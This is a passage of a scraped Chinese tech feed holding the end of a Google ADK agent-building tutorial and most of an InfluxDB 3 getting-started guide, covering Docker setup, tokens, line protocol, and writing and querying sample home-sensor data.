<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2Fb5c12cc7-adk-1-2-1024x771.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/b5c12cc7-adk-1-2-1024x771.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/b5c12cc7-adk-1-2-1024x771.png" alt="" loading="lazy"/></a></p>
<p>与其手动配置代理，不如使用 AI 助手。在右侧面板中，输入：</p>
<p>`Create a simple greeting agent that can:</p>
<ol>
<li>Greet users by name when they introduce themselves</li>
<li>Tell users about itself when asked<br/>
Use gemini-2.5-flash as the model. Keep it simple with just two tools.`</li>
</ol>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2F71fbb3ba-adk-1-3-1024x563.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/71fbb3ba-adk-1-3-1024x563.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/71fbb3ba-adk-1-3-1024x563.png" alt="" loading="lazy"/></a></p>
<p>AI 助手将生成完整的代理配置，包括：</p>
<ul>
<li>适当的代理名称和描述</li>
<li>模型选择</li>
<li>详细说明</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2Ffb5ddcc9-adk-1-4-1024x563.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/fb5ddcc9-adk-1-4-1024x563.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/fb5ddcc9-adk-1-4-1024x563.png" alt="" loading="lazy"/></a></p>
<p>点击保存按钮，然后退出构建器模式。您现在可以与代理聊天了。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.thenewstack.io%2Fmedia%2F2025%2F11%2Fd6c47e08-adk-1-5-1024x541.png" target="_blank" title="https://cdn.thenewstack.io/media/2025/11/d6c47e08-adk-1-5-1024x541.png" ref="nofollow noopener noreferrer"><img src="https://cdn.thenewstack.io/media/2025/11/d6c47e08-adk-1-5-1024x541.png" alt="" loading="lazy"/></a></p>
<h2 data-id="heading-14">比较这三种方法</h2>
<p>使用所有三种方法构建代理后，以下是它们的比较：</p>





















































<table><thead><tr><th><strong>方面</strong></th><th><strong>命令式（Python）</strong></th><th><strong>声明式（YAML）</strong></th><th><strong>可视化构建器</strong></th></tr></thead><tbody><tr><td><strong>最适用于</strong></td><td>复杂逻辑，CI/CD</td><td>简单代理，协作</td><td>原型设计，学习</td></tr><tr><td><strong>学习曲线</strong></td><td>中等</td><td>低</td><td>最低</td></tr><tr><td><strong>灵活性</strong></td><td>最高</td><td>中等</td><td>中等</td></tr><tr><td><strong>模型支持</strong></td><td>所有（通过 LiteLLM）</td><td>仅限 Gemini</td><td>仅限 Gemini</td></tr><tr><td><strong>版本控制</strong></td><td>优秀</td><td>优秀</td><td>良好（可导出 YAML）</td></tr><tr><td><strong>非开发人员友好</strong></td><td>否</td><td>部分是</td><td>是</td></tr><tr><td><strong>调试</strong></td><td>手动</td><td>手动</td><td>内置追踪</td></tr></tbody></table>
<p>主要考虑因素：</p>
<ul>
<li>当您需要最大程度的控制、自定义集成或通过 LiteLLM 支持非 Gemini 模型时，<strong>Python 方法</strong>是最佳选择。</li>
<li><strong>YAML 方法</strong>适用于简单的代理，您希望配置文件的简洁性，并能够混合使用 Python 工具。</li>
<li><strong>可视化构建器</strong>擅长快速原型设计、学习 ADK 概念以及与能够用自然语言描述需求的非开发人员协作。</li>
</ul>
<p>在实践中，这些方法相辅相成。您可以使用可视化构建器进行原型设计和理解架构，然后导出 YAML 进行版本控制和 CI/CD 管道。</p>
<h2 data-id="heading-15">展望未来</h2>
<p>本教程涵盖了使用 Google ADK 的三种开发方法构建您的第一个 AI 代理的基本步骤。每种方法都有其优点，并且该框架的设计旨在让您可以在它们之间流畅切换——从可视化开始，导出到 YAML，并在需要高级功能时转入 Python。</p>
<p>在后续教程中，我们将探讨 ADK 的高级功能，包括具有顺序、并行和循环模式的多代理系统、与模型上下文协议 (MCP) 服务器的工具集成、会话管理和内存持久化，以及部署到 Vertex AI Agent Engine。您在这里建立的基础将在我们处理日益复杂的代理工作流时为您提供很好的帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[InfluxDB 3 入门指南]]></title>    <link>https://juejin.cn/post/7579819594271752230</link>    <guid>https://juejin.cn/post/7579819594271752230</guid>    <pubDate>2025-12-04T15:06:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594271752230" data-draft-id="7579798332778528777" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="InfluxDB 3 入门指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T15:06:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="幻象黑兔"/> <meta itemprop="url" content="https://juejin.cn/user/3039466500930398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            InfluxDB 3 入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3039466500930398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    幻象黑兔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T15:06:59.000Z" title="Thu Dec 04 2025 15:06:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">什么是 InfluxDB？</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Finfluxdata%2Finfluxdb" target="_blank" title="https://github.com/influxdata/influxdb" ref="nofollow noopener noreferrer">InfluxDB</a> 是一个开源的<strong>时序数据库（Time Series Database, TSDB）</strong>，专为高效处理时间序列数据而设计。它适用于实时数据摄取、监控系统、物联网（IoT）传感器数据存储与分析等场景。</p>
<h3 data-id="heading-1">主要特性</h3>
<ul>
<li>🚀 <strong>高性能写入</strong>：支持高吞吐数据写入</li>
<li>🔍 <strong>灵活查询</strong>：支持 SQL 和 InfluxQL</li>
<li>⚙️ <strong>可扩展架构</strong>：支持插件机制，可自定义数据处理逻辑</li>
<li>🧩 <strong>易于集成</strong>：提供多种客户端库（Python、Go、JS 等）</li>
</ul>
<blockquote>
<p>💡 <strong>典型应用场景</strong>：工业物联网传感器监控、服务器性能监控（CPU/内存）、环境监测（温湿度、CO₂）等。</p>
</blockquote>
<h2 data-id="heading-2">快速安装</h2>
<ol>
<li>拉取镜像</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker pull influxdb:3-core 
</code></pre>
<ol start="2">
<li>创建目录并配置权限</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p /opt/influxdb3/data 
<span class="hljs-built_in">mkdir</span> -p /opt/influxdb3/plugins 
<span class="hljs-built_in">chown</span> -R 1500:1500 /opt/influxdb3 <span class="hljs-comment"># 容器内用户 UID:GID 为 1500:1500</span>
</code></pre>
<ol start="3">
<li>启动容器</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker run -d -p 8181:8181 \
    --privileged=<span class="hljs-literal">true</span> \
    -v /opt/influxdb3/data:/var/lib/influxdb3/data \
    -v /opt/influxdb3/plugins:/var/lib/influxdb3/plugins \
    --name influxdb3 \
    influxdb:3-core influxdb3 serve \
        --node-id=influxdb3-master \
        --object-store=file \
        --data-dir=/var/lib/influxdb3/data \
        --plugin-dir=/var/lib/influxdb3/plugins 
</code></pre>
<p>4.验证容器运行状态</p>
<pre><code class="hljs language-bash" lang="bash"> docker <span class="hljs-built_in">exec</span> -it influxdb3 /bin/bash <span class="hljs-comment"># 进入容器</span>
 influxdb3 --version <span class="hljs-comment"># 检查是否正常运行</span>
</code></pre>
<h2 data-id="heading-3">生成token</h2>
<ol>
<li>创建token</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">influxdb3 create token --admin
</code></pre>
<ol start="2">
<li>将token设置成环境变量</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> TOKEN=[YOUR_TOKEN]  <span class="hljs-comment"># 替换为实际生成的Token</span>
</code></pre>
<ol start="3">
<li>验证token有效性</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">influxdb3 show databases --token <span class="hljs-variable">$TOKEN</span> <span class="hljs-comment"># 查询数据库列表</span>
</code></pre>
<h2 data-id="heading-4">InfluxDB 行协议详解</h2>
<p>InfluxDB 3 为高写入吞吐量设计了<strong>行协议</strong>，这是一种高效且易读的写入语法，首次写入数据时会自动创建数据库、表及对应 Schema。</p>
<h3 data-id="heading-5">行协议结构</h3>
<p>一行完整的行协议数据包含 4 个核心部分，格式如下：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">&lt;table&gt;,&lt;tag-set&gt; &lt;field-set&gt; &lt;timestamp&gt;
</code></pre>
<p>各部分说明：</p>
<ul>
<li><strong>table</strong>：表名，如示例中的<code>myTable</code>；</li>
<li><strong>tag set</strong>：标签键值对（键和值均为字符串），多个标签用逗号分隔，如<code>tag1=val1,tag2=val2</code>；</li>
<li><strong>field set</strong>：字段键值对，支持的字段类型有<code>string</code>（需加引号）、<code>float</code>、<code>integer</code>（后缀<code>i</code>）、<code>unsigned integer</code>、<code>boolean</code>，多个字段用逗号分隔，如<code>field1="v1",field2=1i</code>；</li>
<li><strong>timestamp</strong>：Unix 时间戳，需指定精度（如秒、毫秒）。</li>
</ul>
<p>示例：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ca694a365184b4bb17c5575edcc5e9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bm76LGh6buR5YWU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466543&amp;x-signature=OX%2FU4dbRTkgdxgZ6Yf244YYdG%2B4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">数据写入操作</h2>
<h3 data-id="heading-7">使用 CLI 写入数据</h3>
<p>以家庭环境监控数据为例，写入<code>home_environment</code>数据库：</p>
<pre><code class="hljs language-bash" lang="bash">influxdb3 write \
    --database home_environment\
    --token <span class="hljs-variable">$TOKEN</span>\
    --precision s \ <span class="hljs-comment"># 时间戳精度为秒 </span>
<span class="hljs-string">'home,room=Living\ Room temp=21.1,hum=35.9,co=0i 1641024000
home,room=Kitchen temp=21.0,hum=35.9,co=0i 1641024000
home,room=Living\ Room temp=21.4,hum=35.9,co=0i 1641027600
home,room=Kitchen temp=23.0,hum=36.2,co=0i 1641027600
home,room=Living\ Room temp=21.8,hum=36.0,co=0i 1641031200
home,room=Kitchen temp=22.7,hum=36.1,co=0i 1641031200
home,room=Living\ Room temp=22.2,hum=36.0,co=0i 1641034800
home,room=Kitchen temp=22.4,hum=36.0,co=0i 1641034800
home,room=Living\ Room temp=22.2,hum=35.9,co=0i 1641038400
home,room=Kitchen temp=22.5,hum=36.0,co=0i 1641038400
home,room=Living\ Room temp=22.4,hum=36.0,co=0i 1641042000
home,room=Kitchen temp=22.8,hum=36.5,co=1i 1641042000
home,room=Living\ Room temp=22.3,hum=36.1,co=0i 1641045600
home,room=Kitchen temp=22.8,hum=36.3,co=1i 1641045600
home,room=Living\ Room temp=22.3,hum=36.1,co=1i 1641049200
home,room=Kitchen temp=22.7,hum=36.2,co=3i 1641049200
home,room=Living\ Room temp=22.4,hum=36.0,co=4i 1641052800
home,room=Kitchen temp=22.4,hum=36.0,co=7i 1641052800
home,room=Living\ Room temp=22.6,hum=35.9,co=5i 1641056400
home,room=Kitchen temp=22.7,hum=36.0,co=9i 1641056400
home,room=Living\ Room temp=22.8,hum=36.2,co=9i 1641060000
home,room=Kitchen temp=23.3,hum=36.9,co=18i 1641060000
home,room=Living\ Room temp=22.5,hum=36.3,co=14i 1641063600
home,room=Kitchen temp=23.1,hum=36.6,co=22i 1641063600
home,room=Living\ Room temp=22.2,hum=36.4,co=17i 1641067200
home,room=Kitchen temp=22.7,hum=36.5,co=26i 1641067200'</span>
</code></pre>
<h3 data-id="heading-8">使用Python客户端写入</h3>
<h4 data-id="heading-9">安装依赖</h4>
<pre><code class="hljs language-bash" lang="bash">uv pip install influxdb3-python
</code></pre>
<h4 data-id="heading-10">编写代码</h4>
<p>创建<code>influxdb_write.py</code>文件</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> influxdb_client_3 <span class="hljs-keyword">import</span> (
  Point, 
  InfluxDBError, 
  WriteOptions, 
  write_client_options, 
  InfluxDBClient3
)


points = [
  Point(<span class="hljs-string">'home'</span>)
    .tag(<span class="hljs-string">'room'</span>, <span class="hljs-string">'Bathroom'</span>)
    .field(<span class="hljs-string">'temp'</span>, <span class="hljs-number">25.5</span>)
    .field(<span class="hljs-string">'hum'</span>, <span class="hljs-number">50.0</span>)
    .field(<span class="hljs-string">'co'</span>, <span class="hljs-number">9</span>),
  Point(<span class="hljs-string">'home'</span>)
    .tag(<span class="hljs-string">'room'</span>, <span class="hljs-string">'Bedroom'</span>)
    .field(<span class="hljs-string">'temp'</span>, <span class="hljs-number">20.0</span>)
    .field(<span class="hljs-string">'hum'</span>, <span class="hljs-number">60.0</span>)
    .field(<span class="hljs-string">'co'</span>, <span class="hljs-number">10</span>)
]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Successfully wrote batch: data: <span class="hljs-subst">{data}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">str</span>, exception: InfluxDBError</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Failed writing batch: config: <span class="hljs-subst">{self}</span>, data: <span class="hljs-subst">{data}</span> due: <span class="hljs-subst">{exception}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">retry</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">str</span>, exception: InfluxDBError</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Failed retry writing batch: config: <span class="hljs-subst">{self}</span>, data: <span class="hljs-subst">{data}</span> retry: <span class="hljs-subst">{exception}</span>"</span>)


write_options = WriteOptions(
  batch_size=<span class="hljs-number">500</span>,
  flush_interval=<span class="hljs-number">10_000</span>,
  jitter_interval=<span class="hljs-number">2_000</span>,
  retry_interval=<span class="hljs-number">5_000</span>,
  max_retries=<span class="hljs-number">3</span>,
  max_retry_delay=<span class="hljs-number">30_000</span>,
  exponential_base=<span class="hljs-number">2</span>,
)

wco = write_client_options(
  success_callback=success,
  error_callback=error,
  retry_callback=retry,
  write_options=write_options,
)

<span class="hljs-keyword">with</span> InfluxDBClient3(
  host=<span class="hljs-string">'http://localhost:8181/'</span>,
  token=os.getenv(<span class="hljs-string">"INFLUXDB_TOKEN"</span>),
  database=<span class="hljs-string">'home_environment'</span>,
  write_client_options=wco
) <span class="hljs-keyword">as</span> client:
  client.write(points, write_precision=<span class="hljs-string">'s'</span>)
</code></pre>
<p>3.执行写入</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> INFLUXDB_TOKEN=[YOUR_INFLUXDB_TOKEN] <span class="hljs-comment"># 替换为实际Token</span>
python influxdb_write.py
</code></pre>
<h2 data-id="heading-11">数据库查询操作</h2>
<p>InfluxDB 3 支持<strong>SQL</strong>（推荐，基于 Apache Arrow DataFusion 引擎）和<strong>InfluxQL</strong>查询，以下以 SQL 为例演示查询操作。</p>
<h3 data-id="heading-12">使用 CLI 查询</h3>
<pre><code class="hljs language-bash" lang="bash">influxdb3 query \
  --database home_environment \
  --token <span class="hljs-variable">$TOKEN</span> \
  <span class="hljs-string">"SELECT * FROM home ORDER BY time"</span>
</code></pre>
<h3 data-id="heading-13">使用Python客户端查询</h3>
<p>创建<code>influxdb_query.py</code>文件：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> pyarrow <span class="hljs-keyword">import</span> Table
<span class="hljs-keyword">from</span> influxdb_client_3 <span class="hljs-keyword">import</span> (
  InfluxDBClient3
)


<span class="hljs-keyword">with</span> InfluxDBClient3(
  host=<span class="hljs-string">'http://localhost:8181/'</span>,
  token=os.getenv(<span class="hljs-string">"INFLUXDB_TOKEN"</span>),
  database=<span class="hljs-string">'home_environment'</span>
) <span class="hljs-keyword">as</span> client:
  query = <span class="hljs-string">"""
    SELECT * FROM home WHERE room = 'Bathroom'
  """</span>
  reader: Table = client.query(query=query, language=<span class="hljs-string">'sql'</span>)
  rows = reader.to_pylist()
  <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rows:
    <span class="hljs-built_in">print</span>(row) <span class="hljs-comment"># 打印一行数据</span>
</code></pre>
<h3 data-id="heading-14">常用SQL查询示例</h3>
<h4 data-id="heading-15">Schema 查询</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询tables</span>
<span class="hljs-keyword">show</span> tables;

<span class="hljs-comment">-- 查询table字段</span>
<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">in</span> home;
</code></pre>
<h4 data-id="heading-16">基础数据查询</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询表中所有数据</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> home;

<span class="hljs-comment">-- 按时间过滤查询（近1天数据）</span>
